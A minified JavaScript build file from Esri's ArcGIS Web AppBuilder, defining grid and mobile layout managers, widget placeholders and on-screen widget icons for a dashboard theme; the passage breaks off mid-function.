// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"jimu/layoutManagers/BaseLayoutManager":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dijit/_WidgetBase dojo/Deferred dojo/promise/all ../utils ../WidgetPlaceholder ../OnScreenWidgetIcon".split(" "),function(r,a,b,h,l,p,f,m,k,u){var q=null,t;t=r([l],{constructor:function(){this.widgetPlaceholders=[];this.onScreenWidgetIcons=[];this.invisibleWidgetIds=[]},name:"BaseLayoutManager",mapId:"map",map:null,layoutId:"jimu-layout-manager",postCreate:function(){this.containerNode=
this.domNode;this.layoutId=jimuConfig.layoutId},resize:function(){},isSupportEdit:function(){return!1},getMapDiv:function(){},setMap:function(a){this.map=a},onEnter:function(a,c){this.appConfig=a;this.mapId=c},onLeave:function(){},onThemeLoad:function(){},loadAndLayout:function(a){},openWidget:function(a){},onLayoutChange:function(a){},onWidgetChange:function(a,c){},onGroupChange:function(a,c){},onWidgetPoolChange:function(a,c){this.reloadControllerWidget(a,c.controllerId)},onActionTriggered:function(a){},
onLayoutDefinitionChange:function(a,c){},onOnScreenGroupsChange:function(a,c){},destroyOnScreenWidgetsAndGroups:function(a){},loadOnScreenWidgets:function(a){var c=[];b.forEach(a.widgetOnScreen.widgets,function(g){!1===g.visible?this.invisibleWidgetIds.push(g.id):c.push(this.loadOnScreenWidget(g,a))},this);return f(c)},loadOnScreenWidget:function(n,c){var g=new p;if("config"===c.mode&&!n.uri)return c=this._createOnScreenWidgetPlaceHolder(n),g.resolve(c),g;if(!n.uri)return g.resolve(null),g;n.inPanel||
n.closeable?(c=this._createOnScreenWidgetIcon(n),g.resolve(c)):this.widgetManager.loadWidget(n).then(a.hitch(this,function(c){try{c.setPosition(c.position),this.widgetManager.openWidget(c)}catch(v){console.log(console.error("fail to startup widget "+c.name+". "+v.stack))}c.configId=n.id;g.resolve(c)}),function(c){g.reject(c)});return g},onOnScreenWidgetChange:function(a,c){c=a.getConfigElementById(c.id);c.isController?this.reloadControllerWidget(a,c.id):(b.forEach(this.widgetPlaceholders,function(g){g.configId===
c.id&&(g.destroy(),this.loadOnScreenWidget(c,a))},this),this.removeDestroyed(this.widgetPlaceholders),this._updatePlaceholder(a),b.forEach(this.onScreenWidgetIcons,function(g){if(g.configId===c.id){var b=g.state;g.destroy();this.loadOnScreenWidget(c,a).then(function(a){if(c.uri&&"opened"===b)a.onClick()})}},this),this.removeDestroyed(this.onScreenWidgetIcons),b.forEach(this.widgetManager.getOnScreenOffPanelWidgets(),function(g){g.configId===c.id&&(g.destroy(),!1===c.visible?0>this.invisibleWidgetIds.indexOf(c.id)&&
this.invisibleWidgetIds.push(c.id):this.loadOnScreenWidget(c,a))},this),b.forEach(this.invisibleWidgetIds,function(g){g===c.id&&!1!==c.visible&&(this.loadOnScreenWidget(c,a),g=this.invisibleWidgetIds.indexOf(c.id),this.invisibleWidgetIds.splice(g,1))},this),c.isOnScreen||b.forEach(this.widgetManager.getControllerWidgets(),function(g){g.widgetIsControlled(c.id)&&this.reloadControllerWidget(a,g.id)},this))},destroyOnScreenWidgetIcons:function(){b.forEach(this.onScreenWidgetIcons,function(a){a.destroy()},
this);this.onScreenWidgetIcons=[]},destroyOnScreenOffPanelWidgets:function(){b.forEach(this.widgetManager.getOnScreenOffPanelWidgets(),function(a){this.widgetManager.destroyWidget(a)},this)},destroyWidgetPlaceholders:function(){b.forEach(this.widgetPlaceholders,function(a){a.destroy()},this);this.widgetPlaceholders=[]},removeDestroyed:function(a){var c=[];b.forEach(a,function(a){a._destroyed&&c.push(a)});b.forEach(c,function(c){c=a.indexOf(c);a.splice(c,1)})},_createOnScreenWidgetPlaceHolder:function(b){var c;
c="map"===b.position.relativeTo?this.mapId:this.layoutId;var g=a.clone(b);g.position.width=40;g.position.height=40;var n=m.getPositionStyle(g.position);b=new k({index:g.placeholderIndex,configId:b.id});h.setStyle(b.domNode,n);h.place(b.domNode,c);this.widgetPlaceholders.push(b);return b},_createOnScreenWidgetIcon:function(a){var c=new u({panelManager:this.panelManager,widgetManager:this.widgetManager,widgetConfig:a,configId:a.id,map:this.map});"map"===a.position.relativeTo?h.place(c.domNode,this.mapId):
h.place(c.domNode,this.layoutId);h.setStyle(c.domNode,m.getPositionStyle({top:a.position.top,left:a.position.left,right:a.position.right,bottom:a.position.bottom,width:40,height:40}));c.startup();!this.openAtStartWidget&&a.openAtStart&&(c.switchToOpen(),this.openAtStartWidget=a.name);this.onScreenWidgetIcons.push(c);return c},reloadControllerWidget:function(a,c){var b=this.widgetManager.getWidgetById(c);if(b){var m=b.getOpenedIds(),k=b.windowState;this._destroyControllerWidget(b);this._loadControllerWidget(a,
c,m,k)}else this._loadControllerWidget(a,c)},_destroyControllerWidget:function(a){b.forEach(a.getAllConfigs(),function(a){if(a.widgets)this.panelManager.destroyPanel(a.id+"_panel"),b.forEach(a.widgets,function(a){this.panelManager.destroyPanel(a.id+"_panel")},this);else{var c=this.widgetManager.getWidgetById(a.id);c&&(a.inPanel?this.panelManager.destroyPanel(c.getPanel()):this.widgetManager.destroyWidget(c))}},this);this.widgetManager.destroyWidget(a)},_loadControllerWidget:function(b,c,g,m){c=b.getConfigElementById(c);
!1!==c.visible&&this.loadOnScreenWidget(c,b).then(a.hitch(this,function(a){m&&this.widgetManager.changeWindowStateTo(a,m);g&&a.setOpenedIds(g)}))},_updatePlaceholder:function(a){b.forEach(this.widgetPlaceholders,function(c){c.setIndex(a.getConfigElementById(c.configId).placeholderIndex)},this)}});t.getInstance=function(){null===q&&(q=new t);return q};return t})},"jimu/WidgetPlaceholder":function(){define(["dojo/_base/declare","dojo/_base/lang","dojo/_base/html","dijit/_WidgetBase","./utils"],function(r,
a,b,h,l){return r(h,{"class":"jimu-widget-placeholder",postCreate:function(){this.inherited(arguments);this.indexNode=b.create("div",{"class":"inner",innerHTML:this.index},this.domNode);b.setAttr(this.domNode,"title",window.jimuNls.widgetPlaceholderTooltip)},moveTo:function(h){var f={left:"auto",right:"auto",bottom:"auto",top:"auto",width:"auto",height:"auto"},f=a.mixin(f,l.getPositionStyle(h));delete f.width;delete f.height;b.setStyle(this.domNode,f)},setIndex:function(a){this.index=a;this.indexNode.innerHTML=
a}})})},"jimu/OnScreenWidgetIcon":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/on dijit/_WidgetBase ./utils".split(" "),function(r,a,b,h,l,p,f){return r(p,{"class":"jimu-widget-onscreen-icon",postCreate:function(){this.inherited(arguments);this.iconNode=h.create("img",{src:this.widgetConfig.icon},this.domNode);h.setAttr(this.domNode,"title",this.widgetConfig.label);h.setAttr(this.domNode,"data-widget-name",this.widgetConfig.name);this.own(l(this.domNode,
"click",a.hitch(this,function(){this.onClick()})));this.position=a.clone(this.widgetConfig.position);"map"===this.widgetConfig.position.relativeTo&&this.own(l(this.map,"resize",a.hitch(this,function(){var b=a.clone(this.position);delete b.width;delete b.height;this.panel&&this.panel.setPosition(b)})));this.state="closed"},startup:function(){this.inherited(arguments)},onClick:function(){"closed"===this.state?this.switchToOpen():this.switchToClose()},moveTo:function(b){var k={left:"auto",right:"auto",
bottom:"auto",top:"auto",width:"auto",height:"auto"},k=a.mixin(k,f.getPositionStyle(b));delete k.width;delete k.height;h.setStyle(this.domNode,k);this.position=a.clone(b);this.widgetConfig&&this.widgetConfig.panel&&(this.widgetConfig.panel.position=a.clone(b),this.widgetConfig.position=a.clone(b));this.panel&&this.panel.setPosition(a.clone(b));this.widget&&this.widget.setPosition(this.getOffPanelWidgetPosition(this.widget))},destroy:function(){this.panel?this.panelManager.destroyPanel(this.panel):
this.widget&&this.widgetManager.destroyWidget(this.widget);this.inherited(arguments)},switchToOpen:function(){this.state="opened";this.panelManager.closeAllPanelsInGroup(this.widgetConfig.gid);b.forEach(this.widgetManager.getOnScreenOffPanelWidgets(),function(a){a.closeable&&this.widgetManager.closeWidget(a)},this);h.addClass(this.domNode,"jimu-state-selected");this._showLoading();!1===this.widgetConfig.inPanel?this.widgetManager.loadWidget(this.widgetConfig).then(a.hitch(this,function(b){this.widget=
b;b.setPosition(this.getOffPanelWidgetPosition(b));this.widgetManager.openWidget(b);this.own(l(b,"close",a.hitch(this,function(){this.switchToClose()})));this._hideLoading()})):this.panelManager.showPanel(a.clone(this.widgetConfig)).then(a.hitch(this,function(b){this.panel=b;this.own(l(b,"close",a.hitch(this,function(){this.switchToClose()})));this._hideLoading()}))},switchToClose:function(){this.state="closed";h.removeClass(this.domNode,"jimu-state-selected");!1===this.widgetConfig.inPanel?this.widgetManager.closeWidget(this.widget):
this.panelManager.closePanel(this.panel)},getOffPanelWidgetPosition:function(a){var b={relativeTo:a.position.relativeTo},f=h.getMarginBox(this.domNode);a=this.widgetManager.getWidgetMarginBox(a);var l=h.getMarginBox("map"===b.relativeTo?this.map.id:jimuConfig.layoutId),m=f.t+f.h+1;m+a.h>l.h?b.bottom=l.h-f.t+1:b.top=m;window.isRTL?b.right=0>f.l+f.w-a.w?0:f.l+f.w-a.w:f.l+a.w>l.w?b.right=0:b.left=f.l;return b},_showLoading:function(){h.setAttr(this.iconNode,"src",require.toUrl("jimu")+"/images/loading_circle.gif")},
_hideLoading:function(){h.setAttr(this.iconNode,"src",this.widgetConfig.icon)}})})},"jimu/layoutManagers/GridMobileController":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/on dojo/aspect dojo/dom-construct dojo/dom-geometry dojo/dom-class dijit/_WidgetBase dijit/_TemplatedMixin jimu/PanelManager jimu/WidgetManager".split(" "),function(r,a,b,h,l,p,f,m,k,u,q,t,n){return r([u,q],{baseClass:"jimu-dnd-mobile-controller",templateString:'\x3cdiv\x3e\x3cdiv class\x3d"icon-section" data-dojo-attach-point\x3d"iconNode"\x3e\x3c/div\x3e\x3cdiv class\x3d"container-section" data-dojo-attach-point\x3d"containerNode"\x3e\x3c/div\x3e\x3c/div\x3e',
appConfig:null,panelContainerNode:null,openIds:null,toolsCount:0,panels:null,openPanelIds:null,widgetOnCloseHandlerIds:null,panelOnCloseHandlerIds:null,postCreate:function(){this.inherited(arguments);this.panelManager=t.getInstance();this.widgetManager=n.getInstance();this.openIds=[];this.openPanelIds=[];this.widgetOnCloseHandlerIds=[];this.panelOnCloseHandlerIds=[];this.panels={};this.createWidgetIcons();0===this.toolsCount&&h.setStyle(this.domNode,"display","none");this.own(l(this.iconNode,"click",
a.hitch(this,function(a){a.stopPropagation();k.contains(this.containerNode,"in")?(k.remove(this.containerNode,"in"),k.add(this.containerNode,"out")):(k.remove(this.containerNode,"out"),k.add(this.containerNode,"in"))})));this.own(l(document.body,"click",a.hitch(this,function(a){k.contains(this.containerNode,"in")&&!this.isPartOfPopup(a.target||a.srcElement)&&(k.remove(this.containerNode,"in"),k.add(this.containerNode,"out"))})))},destroyOnScreenWidgets:function(){b.forEach(this.appConfig.widgetOnScreen.widgets,
function(a){a.inPanel?this.panelManager.destroyPanel(a.id+"_panel"):this.widgetManager.destroyWidget(a.id)},this)},isPartOfPopup:function(a){var c=this.containerNode;return a===c||h.isDescendant(a,c)},setConfig:function(a){this.appConfig=a;this.createWidgetIcons()},createWidgetIcons:function(){this.toolsCount=0;f.empty(this.containerNode);this.appConfig&&this.appConfig.widgetOnScreen&&b.forEach(this.appConfig.widgetOnScreen.widgets,function(a){a.uri&&a.closeable&&(this._addItem(a),this.toolsCount++)},
this)},_pushId:function(a){this._popId(a);this.openPanelIds.push(a)},_popId:function(a,b){a=this.openPanelIds.indexOf(a);0<=a&&(this.openPanelIds.splice(a,1),b&&0<this.openPanelIds.length&&(b=this.openPanelIds[this.openPanelIds.length-1],this.panelManager.openPanel(b)))},_addItem:function(b){var c=a.clone(b),h=f.create("div",{"class":"row"},this.containerNode);f.create("div",{"class":"widget-icon column",style:"background: url("+b.icon+") no-repeat;"},h);f.create("div",{"class":"widget-label jimu-ellipsis column",
title:b.label,innerHTML:b.label},h);this.own(l(h,"click",a.hitch(this,function(g){var f;g.stopPropagation();b.inPanel?(f=m.getMarginBox(this.panelContainerNode),c.panel={uri:"themes/DashboardTheme/panels/OnScreenPanel/Panel",position:{relativeTo:"browser",left:f.l,top:f.t,width:f.w,height:f.h}},this.panelManager.showPanel(c).then(a.hitch(this,function(b){this.panels[b.id]=b;this._pushId(b.id);b.setPosition({relativeTo:"browser",left:f.l,top:f.t,width:f.w,height:f.h});0>this.panelOnCloseHandlerIds.indexOf(b.id)&&
(this.own(p.after(b,"onClose",a.hitch(this,function(){this._popId(b.id,!0)}))),this.panelOnCloseHandlerIds.push(b.id));return b})).then(a.hitch(this,function(a){this.panelManager.openPanel(a)}))):(f=m.getMarginBox(h),this._toggleOffPanelWidget(b,f.l+f.w,f.t));k.remove(this.containerNode,"in");k.add(this.containerNode,"out")})))},_toggleOffPanelWidget:function(b,f,h){var c=this.openIds.indexOf(b.id);0<=c?(this.widgetManager.closeWidget(b.id),this.openIds.splice(c,1)):this.widgetManager.loadWidget(b).then(a.hitch(this,
function(g){this.openIds.push(b.id);g.setPosition({left:f,top:h,zIndex:100,relativeTo:"map"});this.widgetManager.openWidget(g);0>this.widgetOnCloseHandlerIds.indexOf(b.id)&&(this.own(p.after(g,"onClose",a.hitch(this,function(){c=this.openIds.indexOf(b.id);0<=c&&this.openIds.splice(c,1)}))),this.widgetOnCloseHandlerIds.push(b.id))}))},setPanelPosition:function(c){b.forEach(this.openPanelIds,a.hitch(this,function(a,b){b===this.openPanelIds.length-1&&(c.zIndex=101);"opened"!==this.panels[a].state&&"active"!==
this.panels[a].state||this.panels[a].setPosition(c,!0)}))}})})},"*noref":1}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/topic dojo/on dojo/dom-construct dojo/dom-geometry dojo/Deferred dojo/debounce require ../WidgetManager ../PanelManager ../utils ../dijit/LoadingShelter ./BaseLayoutManager ./GridMobileController".split(" "),function(r,a,b,h,l,p,f,m,k,u,q,t,n,c,g,A,v){var w=null,x;x=r([A],{isEditing:!1,maxStackId:0,dashboardWidgets:[],dashboardPanels:{},currentMode:0,_createLayoutDeferred:null,_isLastLayoutMobile:!1,_isDestroying:!1,
nls:null,_addWidgetTipTemplate:'\x3cdiv class\x3d"tip"\x3e\x3cdiv class\x3d"idx"\x3e${groupIndex}\x3c/div\x3e\x3cdiv class\x3d"label"\x3e${this.nls.addWidgetTip}\x3c/div\x3e\x3c/div\x3e',name:"GridLayoutManager",constructor:function(d,e){this.widgetManager=t.getInstance();this.panelManager=n.getInstance();this.widgetPlaceholders=[];this.preloadWidgetIcons=[];this.preloadGroupPanels=[];this.invisibleWidgetIds=[];c.isMobileUa()?this.own(p(window,"orientationchange",a.hitch(this,this.resize))):this.own(p(window,
"resize",a.hitch(this,this.resize)));this.id=e;this._createLayoutDeferred=null},postMixInProperties:function(){this.inherited(arguments);this.nls={};a.mixin(this.nls,window.jimuNls.gridLayout,window.jimuNls.common);this._addWidgetTipTemplate=this._addWidgetTipTemplate.replace("${this.nls.addWidgetTip}",this.nls.addWidgetTip)},isSupportEdit:function(){return!0},postCreate:function(){this.containerNode=this.domNode;this._isLastLayoutMobile=window.appInfo.isRunInMobile},layout:null,map:null,mapContainer:null,
mapId:"map",hlDiv:null,animTime:500,resize:function(){this._resizeLayout();b.forEach(this.widgetManager.getAllWidgets(),function(a){!1===a.inPanel&&a.resize()},this)},setMap:function(a){this.inherited(arguments);this.panelManager.setMap(a)},_resizeLayout:function(){if(window.appInfo.isRunInMobile){var a=m.getMarginBox(window.jimuConfig.layoutId),a=a.w>a.h?2:1;this.mobilePanel&&(this.currentMode!==a&&(this.currentMode=a,this.mobilePanel.setMobileLayout(a)),this.mobilePanel.resize())}var e;!this.isEditing&&
this.layout?(e=$(this.layoutContainer),a=e.width(),e=e.height(),this.layout.updateSize(a,e)):this.isEditing&&this.editingLayout&&(e=$(this.editLayoutDiv),a=e.width(),e=e.height(),this.editingLayout.updateSize(a,e))},loadAndLayout:function(d){this.appConfig=d;var e=new g;e.placeAt(this.layoutId);e.startup();this._createLayoutDeferred&&!this._createLayoutDeferred.isResolved()?d=this._createLayoutDeferred:(d=new k,d.resolve());d.then(a.hitch(this,this._loadOnScreenGroups)).then(a.hitch(this,this._reArrangeWidgetsLayout,
!0)).then(a.hitch(this,function(){e&&(e.destroy(),e=null);console.timeEnd("Load widgetOnScreen");l.publish("preloadWidgetsLoaded")}),a.hitch(this,function(){e&&(e.destroy(),e=null);console.timeEnd("Load widgetOnScreen");l.publish("preloadWidgetsLoaded")}))},createMapDiv:function(d){h.byId(d)?this.mapDiv=h.byId(d):this.mapDiv=h.create("div",{id:d,style:a.mixin({position:"absolute",backgroundColor:"#EEEEEE",overflow:"hidden",minWidth:"1px",minHeight:"1px"},c.getPositionStyle(this.appConfig.map.position))},
this.layoutId)},getMapDiv:function(){return this.mapDiv},onThemeLoad:function(){this._resizeLayout()},_enableEditing:function(){this.isEditing||(this._createEditingLayout(),$(this.layoutContainer).addClass("hidden"),$(this.editContainer).removeClass("hidden"),$(this.modifyLayoutBtn).addClass("hidden"),this.isEditing=!0,this._resizeLayout())},_disableEditing:function(){$(this.layoutContainer).removeClass("hidden");$(this.editContainer).addClass("hidden");$(this.modifyLayoutBtn).removeClass("hidden");
this.isEditing=!1;this._resizeLayout()},_resetLayoutDefinition:function(){this._disableEditing();this._createLayout(!1,!1);l.publish("editLayoutCancelled")},_saveLayoutDefinition:function(){var d=a.clone(this.editingLayout.toConfig()),e=a.clone(this.appConfig.layoutDefinition);this._simplifyLayoutDefinition(d.content[0]);this._disableEditing();var c=this.editingLayout.root.contentItems[0].getItemsByType("stack"),y=[];b.forEach(c,function(d){!b.some(d.contentItems,a.hitch(this,function(a){if(a.isComponent&&
"map"===a.config.componentName)return!0}))&&/^dd_group_\d+$/.test(d.config.id)&&y.push(d.config.id)});e.layout.config.content=d.content;l.publish("layoutDefinitionChanged",{layoutDefinition:e,groupIds:y})},_simplifyLayoutDefinition:function(d){if("component"!==d.type)if("stack"===d.type){var e;d.activeItemIndex=0;b.some(d.content,a.hitch(this,function(a){if("component"===a.type&&"map"===a.componentName)return e=a,!0}));e?(d.id="map",d.content=[e]):d.content=[]}else b.forEach(d.content,a.hitch(this,
function(a){this._simplifyLayoutDefinition(a)}))},_bindLayoutEvents:function(){this.editingLayout.on("initialised",a.hitch(this,function(){this.editingLayout.createDragSource($(this.dragCreateBtn),{title:" ",type:"component",reorderEnabled:!1,componentName:"widget panel"});var a=this.editingLayout.root.contentItems[0].getItemsByType("stack"),e=[];b.forEach(a,function(a){/^dd_group_\d+$/.test(a.config.id)&&(a=parseInt(a.config.id.split("_")[2],10),e.push(a))});0<e.length?(e=e.sort(function(a,d){return a>
d}),this.maxStackId=e[e.length-1]):this.maxStackId=0;this._arrangeWidgetsInEditingLayout()}));this.editingLayout.on("stackCreated",a.hitch(this,function(a){this.maxStackId++;a.config.id||(a.config.id="dd_group_"+this.maxStackId)}))},_arrangeWidgetsInEditingLayout:function(){b.forEach(this.appConfig.widgetOnScreen.groups,a.hitch(this,function(d){d=this.appConfig.getConfigElementById(d.id);var e=this.editingLayout.root.contentItems[0].getItemsById(d.id),c;e&&0<e.length&&"stack"===e[0].type&&(c=e[0]);
c&&b.forEach(d.widgets,a.hitch(this,function(a,d){var e={id:a.id,type:"component",title:a.label,reorderEnabled:!1,componentName:"widget panel",componentState:{label:a.label}};c.contentItems.length>d?(d=c.contentItems[d],d.config.id=a.id,d.setTitle(a.label)):c.addChild(e)}))}))},_createActionBar:function(d){if(!this.actionBar){this.actionBar=f.create("div",{"class":"layout-actionbar"},d);this.dragCreateBtn=f.create("div",{"class":"jimu-btn jimu-float-leading jimu-leading-margin2 add-btn",innerHTML:this.nls.dragToAdd},
this.actionBar);d=f.create("div",{"class":"jimu-btn-vacation jimu-float-trailing jimu-trailing-margin2 cancel-btn",innerHTML:this.nls.cancel},this.actionBar);var e=f.create("div",{"class":"jimu-btn jimu-float-trailing save-btn",innerHTML:this.nls.ok},this.actionBar);this.own(p(d,"click",a.hitch(this,this._resetLayoutDefinition)));this.own(p(e,"click",a.hitch(this,this._saveLayoutDefinition)))}},_destroyActionBar:function(){f.destroy(this.actionBar);this.actionBar=null},_createLayout:function(d,e,
b){return this._createLayoutDeferred&&!this._createLayoutDeferred.isResolved()?this._createLayoutDeferred.then(a.hitch(this,function(){return this._doCreateLayout(d,e,b)})):this._doCreateLayout(d,e,b)},_doCreateLayout:function(d,e,b){var c,f=new k;this._createLayoutDeferred=new k;if(this.isEditing)return this._createEditingLayout();window.appInfo.isRunInMobile?c=a.hitch(this,this._createMobileLayout):(this.mobileController&&(this.mobileController.destroyOnScreenWidgets(),this.mobileController.destroy(),
this.mobileController=null),c=a.hitch(this,this._createNormalLayout));b?c().then(a.hitch(this,function(){this._createLayoutDeferred.resolve();f.resolve()})):d?c().then(a.hitch(this,this._loadOnScreenGroups)).then(a.hitch(this,this._reArrangeWidgetsLayout,e)).then(a.hitch(this,function(){this._createLayoutDeferred.resolve();f.resolve()})):c().then(a.hitch(this,this._reArrangeWidgetsLayout,e)).then(a.hitch(this,function(){this._createLayoutDeferred.resolve();f.resolve()}));return f},_detachWidgets:function(d){if("stack"===
d.type){for(;1<d.contentItems.length;)d.removeChild(d.contentItems[0],!0);var e=d.contentItems[0];d.addChild({type:"component",componentName:"widget panel",title:" ",isClosable:!1});d.removeChild(e,!0)}else b.forEach(d.contentItems,a.hitch(this,function(a){this._detachWidgets(a)}))},_setupWidgets:function(d,e){d.isClosable=e;"component"!==d.type&&("stack"===d.type?0===d.content.length&&(d.content=[{type:"component",componentName:"widget panel",title:" ",isClosable:e}]):b.forEach(d.content,a.hitch(this,
function(a){this._setupWidgets(a)})))},_onActivePanelChanged:function(d){var e;if(!this._isDestroying&&"widget panel"===d.componentName&&d.config.id){(e=this.dashboardPanels[d.config.id])&&e.domNode?(0===d.container.getElement().find(".jimu-panel").length&&(d.container.getElement().html(e.domNode),d.container.on("resize",u(a.hitch(this,function(){0<d.container.width&&0<d.container.height&&e&&e.resize()}),200))),e.resize(),this.panelManager.openPanel(e)):this._loadDashboardWidget(d.config.id).then(a.hitch(this,
function(e){e&&(d.container.getElement().html(e.domNode),d.container.on("resize",u(a.hitch(this,function(){0<d.container.width&&0<d.container.height&&e.resize()}),200)),e.resize(),this.panelManager.openPanel(e))}));var c=d.parent.config.id,f;b.some(this.appConfig.widgetOnScreen.groups,a.hitch(this,function(a){if(a.id===c)return f=a.widgets,!0}));b.forEach(f,a.hitch(this,function(a){a.id!==d.config.id&&(e=this.dashboardPanels[a.id])&&this.panelManager.closePanel(e)}))}},_createNormalLayout:function(){var d=
new k;this._isDestroying=!1;this.layoutContainer||(this.layoutContainer=f.create("div",{"class":"config"===this.appConfig.mode?"jimu-dnd-layout config":"jimu-dnd-layout"},this.layoutId),"config"===this.appConfig.mode&&(this.modifyLayoutBtn=f.create("div",{"class":"jimu-dnd-layout modify-btn",innerHTML:'\x3cdiv class\x3d"jimu-ellipsis"\x3e\x3cspan class\x3d"feature-action icon-edit"\x3e\x3c/span\x3e'+this.nls.modifyLayout+"\x3c/div\x3e"},this.layoutId),this.own(p(this.modifyLayoutBtn,"click",a.hitch(this,
function(){l.publish("editLayout")})))));b.some(this.appConfig.widgetOnScreen.widgets,function(a){if("themes/DashboardTheme/widgets/Header/Widget"===a.uri)return a.visible?h.setStyle(this.layoutContainer,"top","80px"):(this._removeHighLight(a.id),h.setStyle(this.layoutContainer,"top",0)),!0},this);var e=this.layout,c=a.clone(this.appConfig.layoutDefinition.layout.config);"config"===this.appConfig.mode&&(c.settings.reorderEnabled=!1,c.settings.resizeEnabled=!1,c.settings.enableHeaderDragging=!1,c.dimensions=
{borderWidth:5,dragProxyWidth:0,dragProxyHeight:0});this._setupWidgets(c.content[0],!1);q(["libs/goldenlayout/goldenlayout"],a.hitch(this,function(f){"config"===this.appConfig.mode&&$(this.modifyLayoutBtn).removeClass("hidden");this.layout=new f(c,this.layoutContainer);this.layout.registerComponent("widget panel",a.hitch(this,function(a,d){var e=a.parent.parent.config.id,c;d.widgetId||(d=this._addWidgetTipTemplate,b.some(this.appConfig.widgetOnScreen.groups,function(a){if(a.id===e)return"config"===
this.appConfig.mode&&0===a.widgets.length&&(c=a.placeholderIndex),!0},this),c&&(d=d.replace("${groupIndex}",c),a.getElement().html(d)))}));this.layout.registerComponent("map",a.hitch(this,function(a){this.mapContainer=a.getElement();$("#"+this.mapId).appendTo(this.mapContainer);e&&(this._isDestroying=!0,this._detachWidgets(e.root.contentItems[0]),e.destroy(),this._isDestroying=!1);this.mobilePanel&&(this.mobilePanel.destroy(),this.mobilePanel=null)}));this.layout.on("initialised",a.hitch(this,function(){d.resolve()}));
this.layout.on("stackCreated",a.hitch(this,function(d){d.on("activeContentItemChanged",a.hitch(this,function(a){this._onActivePanelChanged(a)}))}));this.layout.init()}));return d},_createMobileLayout:function(){var d=new k;this.modifyLayoutBtn&&$(this.modifyLayoutBtn).addClass("hidden");if(this.mobilePanel)this.mobilePanel.clearPanels(),d.resolve();else{this.layout&&(this._isDestroying=!0,this._detachWidgets(this.layout.root.contentItems[0]),this._isDestroying=!1);var e=m.getMarginBox(window.jimuConfig.layoutId);
this._loadMobilePanel(this.layoutId,e.w>e.h?2:1).then(a.hitch(this,function(){this.layout&&(this.layout.destroy(),this.layout=null);d.resolve()}))}return d},_createEditingLayout:function(){this.editContainer||(this.editContainer=f.create("div",{"class":"jimu-edit-layout hidden"},this.layoutId),this._createActionBar(this.editContainer),this.editLayoutDiv=f.create("div",{"class":"layout-container"},this.editContainer));var d=this.editingLayout,e=a.clone(this.appConfig.layoutDefinition.layout.config);
e.settings.enableHeaderDropping=!1;e.settings.reorderEnabled=!1;e.dimensions={borderWidth:5,dragProxyWidth:0,dragProxyHeight:0};this._setupWidgets(e.content[0],!0);q(["libs/goldenlayout/goldenlayout"],a.hitch(this,function(b){this.editingLayout=new b(e,this.editLayoutDiv);this.editingLayout.registerComponent("widget panel",a.hitch(this,function(a){a.getElement().html("")}));this.editingLayout.registerComponent("map",a.hitch(this,function(a){a.getElement().html('\x3cdiv class\x3d"maptip"\x3e'+this.nls.mapArea+
"\x3c/div\x3e");d&&d.destroy()}));this._bindLayoutEvents();this.editingLayout.init()}))},_destroyLayout:function(){$("#"+this.mapId).appendTo("#"+this.layoutId);this.layout&&(this.layout.destroy(),this.layout=null,f.destroy(this.layoutContainer),this.layoutContainer=null,this.modifyLayoutBtn&&(f.destroy(this.modifyLayoutBtn),this.modifyLayoutBtn=null));this.editingLayout&&(this._destroyActionBar(),this.editingLayout.destroy(),this.editingLayout=null,f.destroy(this.editContainer),this.editContainer=
null)},destroyOnScreenWidgetsAndGroups:function(){this._destroyOnScreenWidgets();this._destroyOnScreenGroups()},onActionTriggered:function(a){if(!window.appInfo.isRunInMobile)if("editLayout"===a.action)this._enableEditing();else if("highLight"===a.action){var d=this._findContentItemById(a.elementId);d?d.isStack?$(d.element).addClass("highlight"):d.isComponent&&$(d.tab.element).addClass("highlight"):(b.forEach(this.widgetPlaceholders,function(d){d.configId===a.elementId&&this._highLight(d)},this),
b.forEach(this.onScreenWidgetIcons,function(d){d.configId===a.elementId&&this._highLight(d)},this),b.forEach(this.widgetManager.getOnScreenOffPanelWidgets(),function(d){d.configId===a.elementId&&this._highLight(d)},this))}else"removeHighLight"===a.action?this._removeHighLight(a.elementId):"showLoading"===a.action?(h.setStyle(jimuConfig.loadingId,"display","block"),h.setStyle(jimuConfig.mainPageId,"display","none")):"showApp"===a.action&&(h.setStyle(jimuConfig.loadingId,"display","none"),h.setStyle(jimuConfig.mainPageId,
"display","block"))},_findContentItemById:function(a,e){return(a=this.layout.root.contentItems[0].getItemsById(a))&&0<a.length&&(!e||e===a[0].type)?a[0]:null},_highLight:function(a){if(a.domNode){this.hlDiv&&this._removeHighLight(a);var d=m.getMarginBox(a.domNode);this.hlDiv=f.create("div",{style:{position:"absolute",left:d.l+"px",top:d.t+"px",width:d.w+"px",height:d.h+"px"},"class":"icon-highlight"},a.domNode,"before")}},_removeHighLight:function(a){/^dd_group_\d+$/.test(a)?(a=this._findContentItemById(a,
"stack"))&&$(a.element).removeClass("highlight"):/^widgets_\w+_\d+$/.test(a)&&(a=this._findContentItemById(a,"component"))&&$(a.tab.element).removeClass("highlight");this.hlDiv&&(f.destroy(this.hlDiv),this.hlDiv=null)},onEnter:function(a,b){this.appConfig=a;this.isEditing=!1;this.createMapDiv(b);this._createLayout(!1,!1,!0)},onLeave:function(){this._destroyLayout();this.map=null},onWidgetChange:function(a,b){this.appConfig=a;"themes/DashboardTheme/widgets/Header/Widget"===b.uri&&(b.visible?h.setStyle(this.layoutContainer,
"top","80px"):(this._removeHighLight(b.id),h.setStyle(this.layoutContainer,"top",0)),this._resizeLayout());b=a.getConfigElementById(b.id);var d=this.dashboardPanels[b.id];d?(d.reloadWidget(b),(a=this.layout.root.contentItems[0].getItemsByType("component"))&&0<a.length&&a.forEach(function(a){a.config.id===b.id&&a.config.title!==b.label&&(a.config.title=b.label,a.setTitle(b.label))})):(this.mobileController&&(this.mobileController.destroy(),this.mobileController=new v({appConfig:this.appConfig,panelContainerNode:this.mobilePanel.widgetContainerNode}),
